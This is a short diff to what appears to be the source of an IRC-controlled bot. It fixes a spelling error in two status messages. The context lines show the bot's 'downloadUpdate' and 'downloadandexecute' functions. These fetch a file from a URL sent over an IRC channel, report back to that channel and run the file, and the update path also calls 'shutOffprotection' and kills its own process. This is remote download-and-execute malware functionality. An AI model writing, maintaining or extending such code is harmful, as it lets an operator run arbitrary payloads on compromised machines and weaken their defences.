@@ -3693,7 +3693,7 @@ def downloadUpdate(url, s, ircChannel, sha256yesno, thesha256hash):
                 if numErrors > 4:
                     break
     if worked == True:
-        sendmsg("Sucessfully downloaded update from URL: " + url + " to file: " + filename+". Running update...", s, ircChannel)
+        sendmsg("Successfully downloaded update from URL: " + url + " to file: " + filename+". Running update...", s, ircChannel)
         shutOffprotection(True)
         startfile(filename)
         killProcess(argv[0].split("\\")[len(argv[0].split("\\")) - 1])
@@ -3742,7 +3742,7 @@ def downloadandexecute(url, s, ircChannel, sha256yesno, thesha256hash):
                     if numErrors > 4:
                         break
     if worked == True:
-        sendmsg("Sucessfully downloaded from URL: " + url + " to file: " + randfile+".", s, ircChannel)
+        sendmsg("Successfully downloaded from URL: " + url + " to file: " + randfile+".", s, ircChannel)
         startfile(randfile)
     else:
         sendmsg("Unable to download from URL: " + url + " to file: " + randfile + ", after 5 attempts.", s, ircChannel)
